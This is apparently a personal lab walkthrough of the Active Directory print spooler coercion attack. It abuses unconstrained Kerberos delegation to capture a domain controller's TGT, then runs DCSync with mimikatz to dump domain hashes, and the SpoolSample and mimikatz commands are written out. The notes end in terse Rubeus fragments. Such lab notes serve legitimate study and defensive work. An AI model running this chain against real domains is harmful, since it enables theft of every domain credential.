- Attacker has to compromise a system that has an unrestricted kerberos delegation enabled.
- Attacker finds a victim that runs a print server. In this lab this happened to be a Domain Controller.
- Attacker coerces the DC to attempt authenticating to the attacker controlled host which has unrestricted kerberos delegation enabled.
    - This is done via RPC API [`RpcRemoteFindFirstPrinterChangeNotificationEx`](https://msdn.microsoft.com/en-us/library/cc244813.aspx) that allows print clients to subscribe to notifications of changes on the print server.
    - Once the API is called, the DC attempts to authenticate to the compromised host by revealing its TGT to the attacker controlled compromised system.
- Attacker extracts `DC01's` TGT from the compromised system and impersonates the DC to carry a DCSync attack and dump domain member hashes.

## Execution
Our environment for this lab is:
- ws01 - attacker compromised host with kerberos delegation enabled (attacker, server)
- dc01 - domain controller running a print service (victim, target)

We can check if a spool service is running on a remote host like so:

```
ls \\dc01\pipe\spoolss
```
![[image 3.png]]
Trick the victim:
Now, after compiling the amazing PoC [SpoolSample](https://github.com/leechristensen/SpoolSample) by [@tifkin_](https://twitter.com/tifkin_), we execute it with two arguments `target` and `server` (DC with spoolss running on it):
```
.\SpoolSample.exe dc01 ws01
```
![[image.avif]]
```
mimikatz # sekurlsa::tickets
```
![[Pasted image 20240917102123.png]]
we got dc01
We can dcsync
```
mimikatz # lsadump::dcsync /domain:offense.local /user:spotless
```


With rubeus something like
triage
s4u
create net only
steal token